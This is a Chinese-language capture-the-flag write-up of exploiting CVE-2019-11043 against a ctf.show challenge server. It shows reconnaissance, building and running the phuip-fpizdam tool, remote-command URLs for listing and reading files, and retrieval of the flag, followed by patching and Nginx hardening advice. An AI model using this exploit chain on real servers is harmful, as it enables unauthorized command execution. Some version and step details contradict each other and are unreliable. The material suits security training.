# CVE-2019-11043漏洞利用详细过程记录

## 1. 目标信息收集

### 1.1 初始探测
首先，我们对目标网站进行基本探测，获取服务器信息：
```bash
curl -I https://e1680aaf-333f-47bc-8e57-64e288e0ce6d.challenge.ctf.show/
```

返回的响应头显示：
```
Server: nginx/1.20.1
X-Powered-By: PHP/7.1.33dev
```

### 1.2 网站内容分析
访问网站首页显示PHP源代码：
```php
<?php
highlight_file(__FILE__);
?>
```

这表明服务器使用`highlight_file(__FILE__)`显示当前文件内容，且不处理任何参数。

## 2. 漏洞识别与分析

### 2.1 版本信息分析
通过响应头我们获得了关键信息：
- Nginx版本：1.20.1
- PHP版本：7.1.33dev

### 2.2 CVE漏洞搜索
基于这些版本信息，我们进行CVE漏洞搜索：
```bash
# 搜索nginx 1.20.1相关漏洞
searchsploit nginx 1.20.1

# 搜索PHP 7.1.33dev相关漏洞
searchsploit PHP 7.1.33
```

通过网络搜索确认：
- PHP 7.1.33dev版本受CVE-2019-11043漏洞影响
- 该漏洞影响PHP 7.1.x版本（小于7.1.33）的版本

### 2.3 漏洞原理
CVE-2019-11043是一个PHP远程代码执行漏洞，由Wallarm安全研究员Andrew Danau在CTF比赛中发现。该漏洞需要以下条件：
1. 漏洞版本的PHP（7.1.33dev符合条件）
2. Nginx服务器（1.20.1版本）
3. 启用PHP-FPM

漏洞原理是PHP-FPM与Nginx配合时的边界情况，允许攻击者通过发送特制请求来执行远程代码。

## 3. 漏洞利用准备

### 3.1 工具获取
我们使用专门针对此漏洞的利用工具phuip-fpizdam：
```bash
git clone https://github.com/neex/phuip-fpizdam.git
cd phuip-fpizdam
go build
```

### 3.2 环境检查
确认Go语言环境：
```bash
go version
# 输出: go version go1.25.1 darwin/arm64
```

## 4. 漏洞利用过程

### 4.1 初步检测
运行工具检测目标是否易受攻击：
```bash
./phuip-fpizdam https://e1680aaf-333f-47bc-8e57-64e288e0ce6d.challenge.ctf.show/index.php
```

工具输出显示：
```
Base status code is 200
Status code 502 for qsl=1765, adding as a candidate
The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
Attack params found: --qsl 1755 --pisos 189 --skip-detect
Performing attack using php.ini settings...
Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
```

这表明目标确实存在漏洞，并且可以执行命令。

### 4.2 遇到的问题及解决方法
#### 问题1：直接使用curl命令无法执行
尝试直接使用curl命令时：
```bash
curl -s "https://e1680aaf-333f-47bc-8e57-64e288e0ce6d.challenge.ctf.show/index.php?a=id"
```

返回的仍然是PHP源代码，而不是命令执行结果。

#### 解决方法：
根据工具的输出，需要使用特定的参数组合和命令格式：
```
?a=/bin/sh+-c+'[命令]'&
```

#### 问题2：命令执行结果不明显
某些命令执行后，结果可能被PHP代码覆盖或不易识别。

#### 解决方法：
使用base64编码输出结果，使其更明显：
```bash
curl -s "https://e1680aaf-333f-47bc-8e57-64e288e0ce6d.challenge.ctf.show/index.php?a=/bin/sh+-c+'ls+-la+/|+base64'&"
```

### 4.3 寻找flag文件
使用命令列出根目录文件：
```bash
curl -s "https://e1680aaf-333f-47bc-8e57-64e288e0ce6d.challenge.ctf.show/index.php?a=ls"
```

发现了一个可疑文件：`fl0gHe1e.txt`

### 4.4 读取flag文件
使用命令读取flag文件内容：
```bash
curl -s "https://e1680aaf-333f-47bc-8e57-64e288e0ce6d.challenge.ctf.show/index.php?a=/bin/sh+-c+'cat+fl0gHe1e.txt'"
```

成功获取到flag：
```
ctfshow{1fcebdf2-4866-4a6c-8bd9-a76cae9bdb4e}
```

## 5. 漏洞利用细节

### 5.1 攻击参数
工具检测到的有效攻击参数：
- `--qsl 1755`
- `--pisos 189`
- `--skip-detect`

### 5.2 命令执行格式
成功执行命令的格式：
```
?a=/bin/sh+-c+'[命令]'&
```

例如：
- 列出目录：`?a=/bin/sh+-c+'ls'&`
- 读取文件：`?a=/bin/sh+-c+'cat+[文件名]'&`
- 查找文件：`?a=/bin/sh+-c+'find+/+-name+[模式]'&`

## 6. 防护建议

### 6.1 升级PHP版本
升级到不受此漏洞影响的版本：
- PHP 7.2.24或更高版本
- PHP 7.3.11或更高版本

### 6.2 配置检查
检查Nginx配置，避免不安全的配置：
```
location ~ [^/]\.php(/|$) {
    fastcgi_split_path_info ^(.+?\.php)(/.*)$;
    if (!-f $document_root$fastcgi_script_name) {
        return 404;
    }
    fastcgi_pass php:9000;
    fastcgi_index index.php;
    include fastcgi_params;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
}
```

### 6.3 安全监控
- 定期更新和修补服务器软件
- 监控异常的HTTP请求模式
- 使用WAF（Web应用防火墙）检测和阻止恶意请求

## 7. 总结

本次攻击成功利用了CVE-2019-11043漏洞，通过以下步骤获取了flag：
1. 信息收集识别出易受攻击的PHP版本
2. 使用专用工具确认漏洞存在
3. 构造特定格式的请求执行命令
4. 查找并读取flag文件

此漏洞提醒我们及时更新软件版本和检查配置安全的重要性。